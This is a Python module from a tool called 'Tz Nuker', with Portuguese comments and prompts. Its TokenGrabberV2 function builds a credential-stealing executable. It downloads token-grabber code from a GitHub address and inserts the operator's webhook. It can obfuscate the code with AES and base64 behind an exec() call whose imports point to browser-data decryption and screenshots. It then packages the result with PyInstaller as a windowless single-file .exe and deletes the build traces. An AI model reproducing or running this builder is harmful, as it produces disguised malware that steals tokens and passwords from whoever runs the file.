# Esse self foi orgulhosamente codificado por Rdimo (https://instagram.com/tzfofo).
# Copyright (c) 2021 🜲 Oi, eu sou o Tz#0001 | https://instagram.com/tzfofo
# Tz Nuker sob a Licença Pública Geral GNU v2 (1991).

import os
import shutil
import Tz
import requests
import base64
import random
import PyInstaller.__main__

from Crypto.Cipher import AES
from Crypto import Random
from colorama import Fore

from util.plugins.common import setTitle, installPackage

def TokenGrabberV2(WebHook, fileName):
    required = [
        'pyinstaller', 
        'psutil',
        'pycryptodome',
        'pypiwin32',
        'requests',
        'pyautogui',
        'numpy'
    ]
    installPackage(required)
    code = requests.get("https://raw.githubusercontent.com/Tzwebfofo/Tz-token-grabber-V1/main/main.py").text.replace("SUA_WEBHOOK", WebHook)
    with open(f"{fileName}.py", 'w') as f:
        f.write(code)

    print(f"Você quer ofuscar {fileName}.exe?")
    yesno = input(f'{Fore.GREEN}[{Fore.CYAN}>>>{Fore.GREEN}] {Fore.RESET}y/n: {Fore.RED}')
    if yesno.lower() == "y" or yesno.lower() == "yes":
        IV = Random.new().read(AES.block_size)
        key = u''
        for i in range(8):
            key = key + chr(random.randint(0x4E00, 0x9FA5))

        with open(f'{fileName}.py') as f: _file = f.read()

        with open(f'{fileName}.py', "wb") as f:
            encodedBytes = base64.b64encode(_file.encode())
            obfuscatedBytes = AES.new(key.encode(), AES.MODE_CFB, IV).encrypt(encodedBytes)
            f.write(f'import requests;import os;import shutil;import sqlite3;import zipfile;import json;import base64 ;import psutil;from PIL import ImageGrab;from win32crypt import CryptUnprotectData;from re import findall;from Crypto.Cipher import AES;exec(__import__(\'\\x62\\x61\\x73\\x65\\x36\\x34\').b64decode(AES.new({key.encode()}, AES.MODE_CFB, {IV}).decrypt({obfuscatedBytes})).decode())'.encode())

    print(f"{Fore.RED}\nCriando {fileName}.exe\n{Fore.RESET}")
    setTitle(f"Criando {fileName}.exe")
    #the equivalent to "pyinstaller {fileName}.py -n {fileName} --onefile --noconsole --log-level=INFO -i NONE"
    PyInstaller.__main__.run([
        '%s.py' % fileName,
        '--name=%s' % fileName,
        '--onefile',
        '--noconsole',
        '--log-level=INFO',
        '--icon=NONE',
    ])
    try:
        #clean build files
        shutil.move(f"{os.getcwd()}\\dist\\{fileName}.exe", f"{os.getcwd()}\\{fileName}.exe")
        shutil.rmtree('build')
        shutil.rmtree('dist')
        shutil.rmtree('__pycache__')
        os.remove(f'{fileName}.spec')
        os.remove(f'{fileName}.py')
    except FileNotFoundError:
        pass

    print(f"\n{Fore.GREEN}Arquivo criado como {fileName}.exe\n")
    input(f'{Fore.GREEN}[{Fore.YELLOW}>>>{Fore.GREEN}] {Fore.RESET}Digite qualquer coisa para continuar . . .  {Fore.RED}')
    Tz.main()